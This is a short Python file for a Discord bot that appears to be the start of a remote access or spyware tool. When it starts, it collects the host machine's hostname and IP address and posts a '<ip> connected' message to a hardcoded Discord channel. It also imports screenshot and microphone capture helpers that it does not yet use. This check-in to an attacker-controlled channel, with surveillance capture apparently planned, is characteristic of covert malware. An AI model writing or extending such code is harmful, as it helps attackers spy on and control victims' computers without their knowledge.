import discord
from discord.ext import commands
import os
import socket
import time
from screen import Screenshot, Microphone
from dotenv import load_dotenv
load_dotenv(".env")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=';', intents=intents)

@bot.event
async def on_ready():
    guild = await bot.fetch_guild("1198070162432200865")
    channel = await guild.fetch_channel("1209247219874668638")

    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)

    await channel.send(f"{ip_address} connected at {time.strftime('%H:%M:%S')}")

bot.run(os.getenv("TOKEN"))